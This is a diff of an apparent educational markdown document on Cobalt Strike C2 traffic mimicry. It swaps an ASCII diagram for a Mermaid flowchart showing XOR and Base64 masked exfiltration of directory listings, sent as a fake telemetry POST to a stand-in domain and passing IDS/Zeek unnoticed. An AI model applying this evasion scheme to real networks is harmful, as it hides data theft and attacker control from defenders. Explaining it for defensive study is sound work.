@@ -56,39 +56,16 @@ Beyond formatting the HTTP request, the profile controls the behavioral rhythm o
 
 ## Custom ASCII Diagram
 
-```text
-+-----------------------------------------------------------------------------------+
-|                            C2 Traffic Mimicry Architecture                        |
-+-----------------------------------------------------------------------------------+
-|                                                                                   |
-|  [ Compromised Host ]                                                             |
-|         |                                                                         |
-|         |  Data: "Task Output: Directory Listing..."                              |
-|         |  Transform: Mask (XOR) -> Base64 -> Prepend("data=")                    |
-|         v                                                                         |
-|  [ Outbound HTTP Request ]                                                        |
-|    POST /api/v2/logs HTTP/1.1                                                     |
-|    Host: api.legitimate-domain.com                                                |
-|    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)...                       |
-|    Cookie: session_id=TmV3U2Vzc2lvbkRhdGE=                                        |
-|    Content-Type: application/x-www-form-urlencoded                                |
-|                                                                                   |
-|    data=XkdfR0E...<obfuscated_payload>...==                                       |
-|         |                                                                         |
-|         v                                                                         |
-|  [ Network Defenses (IDS/IPS/Zeek) ]                                              |
-|    - Inspects URI: /api/v2/logs (Looks normal)                                    |
-|    - Inspects Headers: Normal User-Agent, valid Host                              |
-|    - Inspects Body: Base64 data, matches expected application flow                |
-|    - Result: ALLOW (Traffic classified as benign telemetry)                       |
-|         |                                                                         |
-|         v                                                                         |
-|  [ Attacker C2 Infrastructure (Team Server) ]                                     |
-|         |  Reverse Transform: Strip("data=") -> Base64 Decode -> Unmask (XOR)     |
-|         v                                                                         |
-|  [ Cobalt Strike Client ] -> Output Displayed to Operator                         |
-|                                                                                   |
-+-----------------------------------------------------------------------------------+
+```mermaid
+flowchart TD
+    Host["Compromised Host"]
+    Data["Data: 'Task Output: Directory Listing...'<br>Transform: Mask (XOR) -> Base64 -> Prepend('data=')"]
+    Http["Outbound HTTP Request<br>POST /api/v2/logs HTTP/1.1<br>Host: api.legitimate-domain.com<br>User-Agent: Mozilla/5.0...<br>Cookie: session_id=TmV3U2Vzc2lvbkRhdGE=<br>Content-Type: application/x-www-form-urlencoded<br><br>data=XkdfR0E...<obfuscated_payload>...=="]
+    Def["Network Defenses (IDS/IPS/Zeek)<br>- Inspects URI: /api/v2/logs (Looks normal)<br>- Inspects Headers: Normal User-Agent, valid Host<br>- Inspects Body: Base64 data, matches expected application flow<br>- Result: ALLOW (Traffic classified as benign telemetry)"]
+    C2["Attacker C2 Infrastructure (Team Server)<br>Reverse Transform: Strip('data=') -> Base64 Decode -> Unmask (XOR)"]
+    Client["Cobalt Strike Client -> Output Displayed to Operator"]
+    
+    Host --> Data --> Http --> Def --> C2 --> Client
 ```
 
 ## Real-World Attack Scenario
